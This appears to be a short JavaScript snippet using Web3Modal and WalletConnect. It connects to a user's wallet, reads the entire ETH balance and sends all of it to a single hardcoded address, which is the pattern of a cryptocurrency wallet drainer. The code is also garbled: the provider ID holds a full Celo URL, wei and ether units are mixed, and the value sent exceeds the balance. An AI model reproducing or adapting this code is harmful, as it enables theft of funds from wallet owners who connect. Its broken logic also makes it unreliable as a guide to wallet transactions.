import Web3Modal from "web3modal";
import WalletConnectProvider from "@walletconnect/web3-provider";

// Initialize Web3Modal with WalletConnect as the provider
const web3Modal = new Web3Modal({
  network: "mainnet", // or 'ropsten', 'rinkeby', etc.
  provider: new WalletConnectProvider({
    infuraId:
      "https://celo-mainnet.infura.io/v3/9fd0522c64d642d1a69265f91c5fbe74",
  }),
});

async function sendMaxETH() {
  // Connect to the wallet
  const provider = await web3Modal.connect();

  // Get the user's ETH balance
  const balance = await provider.eth.getBalance(provider.address);

  // Convert balance to ETH
  const etherBalance = provider.utils.fromWei(balance, "ether");

  // Set the amount to the max balance in ETH
  const amount = etherBalance;

  // Get the current gas price
  const gasPrice = await provider.eth.getGasPrice();

  // Set the gas limit
  const gasLimit = 21000;

  // Calculate the total gas cost
  const gasCost = provider.utils.toWei(gasPrice.mul(gasLimit), "gwei");

  // Calculate the total cost (amount + gas cost)
  const totalCost = amount.add(gasCost);

  // Create a transaction object
  const tx = {
    to: "0x39114B3fA6AFAaD5b8e88A2318c172Db1628AEaD",
    value: totalCost,
    gas: gasLimit,
  };

  // Sign and send the transaction
  const receipt = await provider.eth.sendTransaction(tx);

  console.log(receipt);
}
